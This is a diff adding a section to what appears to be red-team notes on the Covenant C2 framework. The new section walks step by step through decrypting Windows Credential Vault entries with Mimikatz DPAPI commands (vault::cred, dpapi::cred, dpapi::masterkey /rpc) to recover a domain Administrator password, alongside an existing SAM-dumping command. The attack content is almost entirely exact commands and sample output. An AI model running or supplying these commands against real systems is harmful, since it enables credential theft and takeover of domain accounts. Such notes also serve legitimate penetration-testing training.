@@ -60,6 +60,24 @@
 - Will dump the sam file (where password hashes are stored in windows)`Mimikatz token::elevate lsadump::sam`
 - Covenant will save the Crendentials in the Data section as well
 
+## Cracking Credential Vault with mimikatz
+
+- We need a medium integrity grunt
+- `mimikatz vault::cred` will show all services with persisted passwords
+- `ls C:\users\user\appdata\local\microsoft\credentials` will list the passwords files the smallest of the directories is gemerally the one we need.
+- We then go to the tab tak in our grunt. We select Mimikatz from the list and type this task: `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\DIRECTORY-PREVIOUSLY-CHOSEN"`
+- From the output of the task we need to keep aside the value of the guidMasterKey 
+- `ls C:\users\user\appdata\roaming\microsoft\protect` this should list a directory with an sid value in the end
+- If you do an ls on this it should list the same path with the guidMasterKey value we previously found. We need to copy the full path, and then we go to task again and using mimikatz we need to type `"dpapi::masterkey /in:C:\users\user\appdata\roaming\microsoft\protect\sid\guidMasterKey /rpc"`
+- This way we will het in the end of the output the key for the domain controller which should look like this: `key : 60f202bff3c6e2eaedfc4c28ac1adbdd102ec7dba401157f6f8c2056205507ed4e6d93120ebe48959751c0f2c939e515382d7ffec7bd2b129c8eb89466b31f0f`
+- We need to keep this key aside
+- We go back to task and we type `"dpapi::cred /in:C:\users\user\appdata\local\microsoft\credentials\sid /masterkey:<PASTE-THE-KEY-HERE>"
+- This should dump the domain password, you should see it at the end of the output:
+  ```
+  UserName       : domain\Administrator
+  CredentialBlob : Password123!
+  ```
+
 ## Resources
 
 {% embed url="https://github.com/cobbr/Covenant" %} Get Covenant here {% endembed %}
